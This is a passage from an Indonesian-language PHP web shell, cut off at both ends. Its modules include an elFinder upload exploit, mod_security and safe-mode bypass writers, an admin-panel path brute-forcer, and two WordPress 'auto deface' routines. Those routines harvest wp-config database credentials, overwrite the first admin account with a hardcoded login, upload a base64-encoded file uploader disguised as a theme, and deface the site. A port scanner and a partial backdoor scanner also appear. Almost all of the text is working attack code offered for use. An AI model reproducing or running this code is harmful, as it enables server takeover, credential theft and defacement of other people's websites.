lIl07Cn1lbHNlewplY2hvIjxiPmdhZ2FsIjsKfQp9CmVsc2V7CgllY2hvICI8Zm9ybSBtZXRob2Q9cG9zdCBlbmN0eXBlPW11bHRpcGFydC9mb3

JtLWRhdGE+PGlucHV0IHR5cGU9ZmlsZSBuYW1lPWY+PGlucHV
0IG5hbWU9diB0eXBlPXN1Ym1pdCBpZD12IHZhbHVlPXVwPjxicj4iOwp9Cgo/Pg==";
                $decode_isi = base64_decode($isi_nama_doang);
                $encode = base64_encode($nama_doang);
                $fp = fopen($nama_doang, "w");
                fputs($fp, $decode_isi);
                echo "[!] <a href='$korban' target='_blank'>$korban</a> <br>";
                echo "# Upload[1] ......<br>";
                $url_mkfile = "$korban?cmd=mkfile&name=$nama_doang&target=l1_Lw";
                $b = file_get_contents("$url_mkfile");
                $post1 = array("cmd" => "put", "target" => "l1_$encode", "content" => "$decode_isi",);
                $post2 = array("current" => "8ea8853cb93f2f9781e0bf6e857015ea", "upload[]" => "@$nama_doang",);
                $output_mkfile = ngirim("$korban", $post1);
                if (preg_match("/$nama_doang/", $output_mkfile)) {
                    echo "<font color='lime'># Upload Sukses 1... => $nama_doang<br># Coba buka di 

../../elfinder/files/...</font><br><br>";
                } else {
                    echo "<font color='red'># Upload Gagal mblo! 1 <br># Uploading 2..</font><br>";
                    $upload_ah = ngirim("$korban?cmd=upload", $post2);
                    if (preg_match("/$nama_doang/", $upload_ah)) {
                        echo "<font color='lime'># Upload Sukses 2 => $nama_doang<br># Coba buka di 

../../elfinder/files/...</font><br><br>";
                    } else {
                        echo "<font color='red'># Upload Gagal Lagi mblo! 2</font><br><br>";
                    }
                }
            }
        }


} elseif($_GET['go'] == 'sec') {
echo '<center><h1>Safe Mode</h1>';
    echo '<div class="content">';
    echo "<div class=header><center><h3><span>| SAFE MODE AND MOD SECURITY DISABLED AND PERL 500 INTERNAL ERROR 

BYPASS |</span></h3>Following php.ini and .htaccess(mod) and perl(.htaccess)[convert perl extention *.pl => 

*.sh  ] files create in following dir<br>| ".$GLOBALS['cwd']." |<br><br />";
    echo '<a href=? onclick="g(null,null,\'php.ini\',null)">| PHP.INI | </a><a href=? onclick="g

(null,null,null,\'ini\')">| .htaccess(Mod) | </a><a href=? onclick="g(null,null,null,null,\'sh\')">| .htaccess

(perl) | </a></center><br>';
    if(!empty($_POST['p2']) && isset($_POST['p2']))
    {
        $fil=fopen($GLOBALS['cwd'].".htaccess","w");
        fwrite($fil,'<IfModule mod_security.c>
            Sec------Engine Off
            Sec------ScanPOST Off
            </IfModule>');
        fclose($fil);
   }
   if(!empty($_POST['p1'])&& isset($_POST['p1']))
   {
        $fil=fopen($GLOBALS['cwd']."php.ini","w");
        fwrite($fil,'safe_mode=OFF
            disable_functions=NONE');
        fclose($fil);
    }
    if(!empty($_POST['p3']) && isset($_POST['p3']))
    {
        $fil=fopen($GLOBALS['cwd'].".htaccess","w");
        fwrite($fil,'Options FollowSymLinks MultiViews Indexes ExecCGI
        AddType application/x-httpd-cgi .sh
        AddHandler cgi-script .pl
        AddHandler cgi-script .pl');
        fclose($fil); 
    }
    echo "</div>";
    echo '</div>';
  
} elseif($_GET['go'] == 'fake_root') {
	ob_start();
	$cwd = getcwd();
	$ambil_user = explode("/", $cwd);
	$user = $ambil_user[2];
	if($_POST['reverse']) {
		$site = explode("\r\n", $_POST['url']);
		$file = $_POST['file'];
		foreach($site as $url) {
			$cek = getsource("$url/~$user/$file");
			if(preg_match("/hacked/i", $cek)) {
				echo "URL: <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a> -> <font color=blue>Fake Root!</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		Filename: <br><input type='text' name='file' value='deface.html' size='50' height='10'><br>
		User: <br><input type='text' value='$user' size='50' height='10' readonly><br>
		Domain: <br>
		<textarea style='width: 450px; height: 250px;' name='url'>";
		reverse($_SERVER['HTTP_HOST']);
		echo "</textarea><br>
		<input type='submit' name='reverse' value='Scan Fake Root!' style='width: 450px;'>
		</form><br>
		NB: Sebelum gunain Tools ini , upload dulu file deface kalian di dir /home/user/ dan /home/user/public_html.</center>";
	}	
	} elseif($_GET['go'] == 'admf') {
    ?>
<type='text/javascript'/></script>
<style>
</style>
 
</head>
<link rel="SHORTCUT ICON"  href="http://i.imgur.com/2Koa43H.png">
</style>
<br>
<br><center><font color='Lavenda'> NB: Jika Mau Jalankan Tools ini, Belakang Domain Tambahkan " / "  </font></center>
<br>
<td width=100% id=Gretz>
<form action="" method="post">
<center><p class="frontboxtext"><input name="hash_lol" class="textbox" type="text" size="30" value="http://www.target.co.il/"/>
<input name="submit_lol" class="textbox" value="Submit Site" type="submit">
</form>
<?php
set_time_limit(0);
 
if (isset($_POST["submit_lol"])) {
$url = $_POST['hash_lol'];
echo "<br />Crot ".$url."<br /><br />";
 
$adminlocales = array("-adminweb/","!adminweb/","@adminweb/","adminweb121/","adminweb90/","adminweb145/","khususadmin/","rahasiaadm/","adminweb123123/","adminweb2222/","adminlanel/","adminlanel.php/","monitor123.php/","masuk.php/","css.php/", "admin1235.php/", "master.php/","1admin/","123admin/","addmin/","home.php","css/","rediect.php/","masuk.php/","index.php/","webpaneladmin123/","registeradm/","register/","member123/","123adminweb/","123paneladminweb/","panelauth1231/","loginadminweb21/","loginadminweb123/","loginadminweb/","webadmin123/","redakturadmin/","paneladminweb/","admloginadm/","4dm1n/","admin12345/","adminweb12/","adminweb111/","adminweb123/","adminweb1/","gangmasuk/","gangadmin/","admredaktur/","adminwebredaktur/","adminredaktur/","adm/", "_adm_/", "_admin_/", "_loginadm_/", "_login_admin_/", "minmin", "loginadmin3/",  "masuk/admin", "webmail", "_loginadmin_/", "_login_admin.php_/", "_admin_/", "_administrator_/", "operator/", "sika/", "adminweb/", "develop/", "ketua/", "redaktur/", "author/", "admin/", "administrator/", "adminweb/", "user/", "users/", "dinkesadmin/", "retel/", "author/", "panel/", "paneladmin/", "panellogin/", "redaksi/", "cp-admin/", "login@web/", "admin1/", "admin2/", "admin3/", "admin4/", "admin5/", "admin6/", "admin7", "admin8", "admin9", "admin10", "master/", "master/index.php", "master/login.php", "operator/index.php", "sika/index.php", "develop/index.php", "ketua/index.php","redaktur/index.php", "admin/index.php", "administrator/index.php", "adminweb/index.php", "user/index.php", "users/index.php", "dinkesadmin/index.php", "retel/index.php", "author/index.php", "panel/index.php", "paneladmin/index.php", "panellogin/index.php", "redaksi/index.php", "cp-admin/index.php", "operator/login.php", "sika/login.php", "develop/login.php", "ketua/login.php", "redaktur/login.php", "admin/login.php", "administrator/login.php", "adminweb/login.php", "user/login.php", "users/login.php", "dinkesadmin/login.php", "retel/login.php", "author/login.php", "panel/login.php", "paneladmin/login.php", "panellogin/login.php", "redaksi/login.php", "cp-admin/login.php", "terasadmin/", "terasadmin/index.php", "terasadmin/login.php", "rahasia/", "rahasia/index.php", "rahasia/admin.php", "rahasia/login.php", "dinkesadmin/", "dinkesadmin/login.php", "adminpmb/", "adminpmb/index.php", "adminpmb/login.php", "system/", "system/index.php", "system/login.php", "webadmin/", "webadmin/index.php", "webadmin/login.php", "wpanel/", "wpanel/index.php", "wpanel/login.php", "adminpanel/index.php", "adminpanel/", "adminpanel/login.php", "adminkec/", "adminkec/index.php", "adminkec/login.php", "admindesa/", "admindesa/index.php", "admindesa/login.php", "adminkota/", "adminkota/index.php", "adminkota/login.php", "admin123/", "admin123/index.php", "dologin/", "home.asp/","supervise/amdin", "relogin/adm", "checkuser", "relogin.php", "relogin.asp", "wp-admin", "registration", "suvervise", "superman.php", "member.php","home/admin","po-admin/","do_login.php", "bo-login", "bo_login.php/", "index.php/admin", "admiiin.php", "masuk/adm","website_login/", "dashboard/admin", "dashboard.php", "dashboard_adm", "admin123/login.php", "logout1/", "logout/","pengelola/login", "manageradm/", "logout.asp", "manager/adm", "pengelola/web","auth/panel", "logout/index.php", "logout/login.php", "controladm/", "logout/admin.php", "adminweb_setting", "adm/index.asp", "adm.asp", "affiliate.asp", "adm_auth.asp", "memberadmin.asp", "siteadmin/login.asp", "siteadmin/login", "paneldecontrol", "cms/admin", "administracion.php", "/ADMON/", "administrador/", "panelc/", "admincp", "admcp", "cp", "modcp", "moderatorcp", "adminare", "cpanel", "controlpanel");
 
foreach ($adminlocales as $admin){
$headers = get_headers("$url$admin");
if (eregi('200', $headers[0])) {
    echo "<a href='$url/$admin'>$url$admin</a> <font color='gold'>Ditemukan!</font><br />";
}
else {
    echo "$url$admin <font color='red'>Tidak Dapat</font><br />";
}
}
}  
} elseif($_GET['go'] == 'adminer') {
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	function adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('adminer.php')) {
		echo "<center><font color=blue><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
	} else {
		if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
			echo "<center><font color=blue><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
		} else {
			echo "<center><font color=red>gagal buat file adminer</font></center>";
		}
	}
} elseif($_GET['go'] == 'auto_dwp') {
	if($_POST['auto_deface_wp']) {
		function anucurl($sites) {
    		$ch = curl_init($sites);
	       		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	       		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	       		  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
	       		  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	       		  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		function lohgin($cek, $web, $userr, $pass, $wp_submit) {
    		$post = array(
                   "log" => "$userr",
                   "pwd" => "$pass",
                   "rememberme" => "forever",
                   "wp-submit" => "$wp_submit",
                   "redirect_to" => "$web",
                   "testcookie" => "1",
                   );
			$ch = curl_init($cek);
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
				  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
				  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
				  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
				  curl_setopt($ch, CURLOPT_POST, 1);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
				  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		$scan = $_POST['link_config'];
		$link_config = scandir($scan);
		$script = htmlspecialchars($_POST['script']);
		$user = "alxwahid";
		$pass = "512536@";
		$passx = md5($pass);
		foreach($link_config as $dir_config) {
			if(!is_file("$scan/$dir_config")) continue;
			$config = file_get_contents("$scan/$dir_config");
			if(preg_match("/WordPress/", $config)) {
				$dbhost = ambilkata($config,"DB_HOST', '","'");
				$dbuser = ambilkata($config,"DB_USER', '","'");
				$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
				$dbname = ambilkata($config,"DB_NAME', '","'");
				$dbprefix = ambilkata($config,"table_prefix  = '","'");
				$prefix = $dbprefix."users";
				$option = $dbprefix."options";
				$conn = mysql_connect($dbhost,$dbuser,$dbpass);
				$db = mysql_select_db($dbname);
				$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
				$result = mysql_fetch_array($q);
				$id = $result[ID];
				$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
				$result2 = mysql_fetch_array($q2);
				$target = $result2[option_value];
				if($target == '') {					
					echo "[-] <font color=red>error, tidak bisa ambil nama domain nya</font><br>";
				} else {
					echo "[+] $target <br>";
				}
				$update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
				if(!$conn OR !$db OR !$update) {
					echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
					mysql_close($conn);
				} else {
					$site = "$target/wp-login.php";
					$site2 = "$target/wp-admin/theme-install.php?upload";
					$b1 = anucurl($site2);
					$wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"","\" />");
					$b = lohgin($site, $site2, $user, $pass, $wp_sub);
					$anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
					$upload3 = base64_decode("Z2FudGVuZw0KPD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRmaWxlM1sndG1wX25hbWUnXSwgIi4uLy4uLy4uLy4uLyRuZXdmaWxlMyIpOw0KDQo/Pg==");
					$www = "m.php";
					$fp5 = fopen($www,"w");
					fputs($fp5,$upload3);
					$post2 = array(
							"_wpnonce" => "$anu2",
							"_wp_http_referer" => "/wp-admin/theme-install.php?upload",
							"themezip" => "@$www",
							"install-theme-submit" => "Install Now",
							);
					$ch = curl_init("$target/wp-admin/update.php?action=upload-theme");
						  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
						  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
						  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
						  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
						  curl_setopt($ch, CURLOPT_POST, 1);
						  curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
						  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
						  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
					      curl_setopt($ch, CURLOPT_COOKIESESSION, true);
					$data3 = curl_exec($ch);
						  curl_close($ch);
					$y = date("Y");
					$m = date("m");
					$namafile = "id.php";
					$fpi = fopen($namafile,"w");
					fputs($fpi,$script);
					$ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
						   curl_setopt($ch6, CURLOPT_POST, true);
						   curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
						   curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
						   curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
	       		  		   curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  		   curl_setopt($ch6, CURLOPT_COOKIESESSION, true);
					$postResult = curl_exec($ch6);
						   curl_close($ch6);
					$as = "$target/k.php";
					$bs = anucurl($as);
					if(preg_match("#$script#is", $bs)) {
            	       	echo "[+] <font color='blue'>berhasil depes...</font><br>";
            	       	echo "[+] <a href='$as' target='_blank'>$as</a><br><br>"; 
            	        } else {
            	        echo "[-] <font color='red'>gagal depes...</font><br>";
            	        echo "[!!] coba cara manual: <br>";
            	        echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
            	        echo "[+] username: <font color=blue>$user</font><br>";
            	        echo "[+] password: <font color=blue>$pass</font><br><br>";     
            	        }
            		mysql_close($conn);
				}
			}
		}
	} else {
		echo "<center><h1>WordPress Auto Deface</h1>
		<form method='post'>
		<input type='text' name='link_config' size='50' height='10' value='$dir'><br>
		<input type='text' name='script' height='10' size='50' placeholder='ALx was Here..!' required><br>
		<input type='submit' style='width: 450px;' name='auto_deface_wp' value='LAUNCH!'>
		</form>
		<br><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span>
		</center>";
	}
} elseif($_GET['go'] == 'auto_dwp2') {
	if($_POST['auto_deface_wp']) {
		function anucurl($sites) {
    		$ch = curl_init($sites);
	       		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	       		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	       		  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
	       		  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	       		  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIESESSION,true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		function lohgin($cek, $web, $userr, $pass, $wp_submit) {
    		$post = array(
                   "log" => "$userr",
                   "pwd" => "$pass",
                   "rememberme" => "forever",
                   "wp-submit" => "$wp_submit",
                   "redirect_to" => "$web",
                   "testcookie" => "1",
                   );
			$ch = curl_init($cek);
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
				  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
				  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
				  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
				  curl_setopt($ch, CURLOPT_POST, 1);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
				  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		$link = explode("\r\n", $_POST['link']);
		$script = htmlspecialchars($_POST['script']);
		$user = "alxwahid";
		$pass = "512536@";
		$passx = md5($pass);
		foreach($link as $dir_config) {
			$config = anucurl($dir_config);
			$dbhost = ambilkata($config,"DB_HOST', '","'");
			$dbuser = ambilkata($config,"DB_USER', '","'");
			$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
			$dbname = ambilkata($config,"DB_NAME', '","'");
			$dbprefix = ambilkata($config,"table_prefix  = '","'");
			$prefix = $dbprefix."users";
			$option = $dbprefix."options";
			$conn = mysql_connect($dbhost,$dbuser,$dbpass);
			$db = mysql_select_db($dbname);
			$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
			$result = mysql_fetch_array($q);
			$id = $result[ID];
			$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
			$result2 = mysql_fetch_array($q2);
			$target = $result2[option_value];
			if($target == '') {					
				echo "[-] <font color=red>error, tidak bisa ambil nama domain nya</font><br>";
			} else {
				echo "[+] $target <br>";
			}
			$update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
			if(!$conn OR !$db OR !$update) {
				echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
				mysql_close($conn);
			} else {
				$site = "$target/wp-login.php";
				$site2 = "$target/wp-admin/theme-install.php?upload";
				$b1 = anucurl($site2);
				$wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"","\" />");
				$b = lohgin($site, $site2, $user, $pass, $wp_sub);
				$anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
				$upload3 = base64_decode("Z2FudGVuZw0KPD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRmaWxlM1sndG1wX25hbWUnXSwgIi4uLy4uLy4uLy4uLyRuZXdmaWxlMyIpOw0KDQo/Pg==");
				$www = "m.php";
				$fp5 = fopen($www,"w");
				fputs($fp5,$upload3);
				$post2 = array(
						"_wpnonce" => "$anu2",
						"_wp_http_referer" => "/wp-admin/theme-install.php?upload",
						"themezip" => "@$www",
						"install-theme-submit" => "Install Now",
						);
				$ch = curl_init("$target/wp-admin/update.php?action=upload-theme");
					  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
					  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
					  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
					  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
					  curl_setopt($ch, CURLOPT_POST, 1);
					  curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
					  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
					  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
				      curl_setopt($ch, CURLOPT_COOKIESESSION, true);
				$data3 = curl_exec($ch);
					  curl_close($ch);
				$y = date("Y");
				$m = date("m");
				$namafile = "id.php";
				$fpi = fopen($namafile,"w");
				fputs($fpi,$script);
				$ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
					   curl_setopt($ch6, CURLOPT_POST, true);
					   curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
					   curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
					   curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
	       		  	   curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
	       		 	   curl_setopt($ch6, CURLOPT_COOKIESESSION,true);
				$postResult = curl_exec($ch6);
					   curl_close($ch6);
				$as = "$target/k.php";
				$bs = anucurl($as);
				if(preg_match("#$script#is", $bs)) {
                   	echo "[+] <font color='blue'>berhasil depes...</font><br>";
                   	echo "[+] <a href='$as' target='_blank'>$as</a><br><br>"; 
                    } else {
                    echo "[-] <font color='red'>gagal depes...</font><br>";
                    echo "[!!] coba cara manual: <br>";
                    echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
                    echo "[+] username: <font color=blue>$user</font><br>";
                    echo "[+] password: <font color=blue>$pass</font><br><br>";     
                    }
            	mysql_close($conn);
			}
		}
	} else {
		echo "<center><h1>WordPress Auto Deface V.2</h1>
		<form method='post'>
		Link Config: <br>
		<textarea name='link' placeholder='http://target.com/alx_config/user-config.txt' style='width: 450px; height:250px;'></textarea><br>
		<input type='text' name='script' height='10' size='50' placeholder='ALx was Here..!' required><br>
		<input type='submit' style='width: 450px;' name='auto_deface_wp' value='LAUNCH!'>
		</form></center>";
	}
	} elseif($_GET['go'] == 'whois') {
@set_time_limit(0);
   @error_reporting(0);
   function sws_domain_info($site)
   {
   $getip = @file_get_contents("http://networktools.nl/whois/$site");
   flush();
   $ip = @findit($getip,'<pre>','</pre>');
   return $ip;
   flush();
   }
   function sws_net_info($site)
   {
   $getip = @file_get_contents("http://networktools.nl/asinfo/$site");
   $ip = @findit($getip,'<pre>','</pre>');
   return $ip;
   flush();
   }
   function sws_site_ser($site)
   {
   $getip = @file_get_contents("http://networktools.nl/reverseip/$site");
   $ip = @findit($getip,'<pre>','</pre>');
   return $ip;
   flush();
   }
   function sws_sup_dom($site)
   {
   $getip = @file_get_contents("http://www.magic-net.info/dns-and-ip-tools.dnslookup?subd=".$site."&Search+subdomains=Find+subdomains");
   $ip = @findit($getip,'<strong>Nameservers found:</strong>','<script type="text/javascript">');
   return $ip;
   flush();
   }
   function sws_port_scan($ip)
   {
   $list_post = array('80','21','22','2082','25','53','110','443','143');
   foreach ($list_post as $o_port)
   {
   $connect = @fsockopen($ip,$o_port,$errno,$errstr,5);
   if($connect)
   {
   echo ' $ip : $o_port ??? <u style="color: blue">Open</u> <br /><br />';
   flush();
   }
   }
   }
   function findit($mytext,$starttag,$endtag) {
   $posLeft = @stripos($mytext,$starttag)+strlen($starttag);
   $posRight = @stripos($mytext,$endtag,$posLeft+1);
   return @substr($mytext,$posLeft,$posRight-$posLeft);
   flush();
   }
   echo '<br><br><center>';
   echo '
    <br />
    <div class="sc"><form method="post"><table>
    <tr><th colspan="5" style="border: 2px blue dotted;">Whois Site</th></tr>
    <tr><td>Site to scan </td><td>:</td><td><input type="text" name="site" size="50" style="color:Lavender;" class="inputz" value="site.com" /> � <input class="inputzbut" type="submit" style="color:Lavender;background-color:#000000" name="scan" value="Scan !" /></td></tr>
    </table></form></div>';
   if(isset($_POST['scan']))
   {
   $site = @htmlentities($_POST['site']);
   if (empty($site)){die('<br /><br /> Not add IP .. !');}
   $ip_port = @gethostbyname($site);
   echo "
   <br /><div class='sc2'>Scanning [ $site ip $ip_port ] ... </div>
   <div class='tit'> <br /><br />|-------------- Port Server ------------------| <br /></div>
   <div class='ru'> <br /><br /><pre>
   ";
   echo "".sws_port_scan($ip_port)." </pre></div> ";
   flush();
   echo '<div class="tit"><br /><br />|-------------- Domain Info ------------------| <br /> </div>
   <div class="ru">
   <pre>".sws_domain_info($site)."</pre></div>';
   flush();
   echo '
   <div class="tit"> <br /><br />|-------------- Network Info ------------------| <br /></div>
   <div class="ru">
   <pre>".sws_net_info($site)."</pre> </div>';
   flush();
   echo '<div class="tit"> <br /><br />|-------------- subdomains Server ------------------| <br /></div>
   <div class="ru">
   <pre>".sws_sup_dom($site)."</pre> </div>';
   flush();
   echo '<div class="tit"> <br /><br />|-------------- Site Server ------------------| <br /></div>
   <div class="ru">
   <pre>".sws_site_ser($site)."</pre> </div>
   <div class="tit"> <br /><br />|-------------- END ------------------| <br /></div>';
   flush();
   }
    echo '</center>';     
    } elseif($_GET['go'] == 'shellscanner') {
?>
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_openBrWindow(theURL,winName,features) { //v2.0
  window.open(theURL,winName,features)
}
//-->
</script>
<style type="text/css">
<!--
.single{
   border: 1px solid #00ff00;box-shadow: 0px 0px 15px #55FF55;
   padding: 5px;
}
.me  {
   font-size:11px; font-family:Tahoma,Verdana,Arial; color:#ccff99;
   border: 0px;
   padding: 5px;
}
 
.isi{
   padding: 2px;
   border:1px solid #666666;
   font-family: Tahoma;
   color: #ccff99;
   background-color: #666666;
   font-size: 10px;
   font-weight: bold;
}
-->
</style>
<style type="text/css">
#patch {position:absolute; height:1; width:1px; top:0; left:0;}
</style>
</head>
<body>
<center>

<center><font color="gold" size="14" face="arial">Backdoor Scanner</font></center><br>
<?php
if(isset($_REQUEST['edit']) && $_REQUEST['edit']=='file'){
   if(isset($_POST['yes'])){
      $filename = $_GET['file'];
      echo "<br><br><br><font color=red size=3><b><center>".$filename." deleted...</b></font><br><br><br><br><br><br><br>";
      unlink($filename);
      echo "<META HTTP-EQUIV=Refresh CONTENT=\"2; URL=javascript:window.close();\">";
   }else{
      if($_POST['update']) {
         $filename = $_POST['file'];
         if(is_writable($filename)) {
            $handle = fopen($filename, "w+");
            $isi=$_POST['content'];
            fwrite($handle, stripslashes($isi));
            fclose($handle);
            $stat= "<center><strong>edited successfully<br>";
         } else {
            $stat= "<center><font color=red><strong>Error! File may not be writable.</font></center>";
         }
      }
      if($_POST['close']) {
         echo "<META HTTP-EQUIV=Refresh CONTENT=\"0; URL=javascript:window.close();\">";
      }
      $filename = $_GET['file'];
      if (file_exists($filename)){
         $vuln = $_GET['bug'];
         $handle = fopen($filename, "r");
         $contents = fread($handle, filesize($filename));
      ?>
      <center>
      <table>
         <tr><td align="left" class="me"><strong><?=$filename?>��>> Contains :�<?=$vuln?></strong></td></tr>
         <tr><td class="me">
            <form method="post" action="">
            <input type="hidden" name="file" value="<?=$filename?>">
            <textarea name="content" cols="80" rows="15"><?=htmlspecialchars($contents)?></textarea><br>
         </td></tr>
         <tr><td align="center" class="me">
         <?php
         if($_POST['delete']) {
            echo "Are you sure to delete ".$filename." ?";
         ?>
         <tr><td align="center" class="me">
            <input type="submit" name="yes" value=" Y E S ">
            <input type="submit" name="no" value=" N O ">
         </td></tr>
         <?php
         }else{
         echo $stat;
         ?>
         </td></tr>
         <tr><td align="right" class="me">
            <input type="submit" name="close" value=" C l o s e ">
            <input type="submit" name="delete" value=" D e l e t e ">
            <input type="submit" name="update" value=" S a v e ">
         </td></tr>
         <?php
         }
         fclose($handle);
         ?>
      </table>
</form>
<?php
}else{
echo "<br><br><br><font color=red size=3><b><center>".$filename." not exist...</b></font><br><br><br><br><br><br><br>";
echo "<META HTTP-EQUIV=Refresh CONTENT=\"4; URL=javascript:window.close();\">";
}
?>
</center>
<?php
}
}elseif(isset($_POST['Submit'])){
   $ceks = array('base64_decode','system','passthru','popen','exec','shell_exec','eval','move_uploaded_file');
   foreach($ceks as $ceker){
      if($_POST[$ceker]<>""){
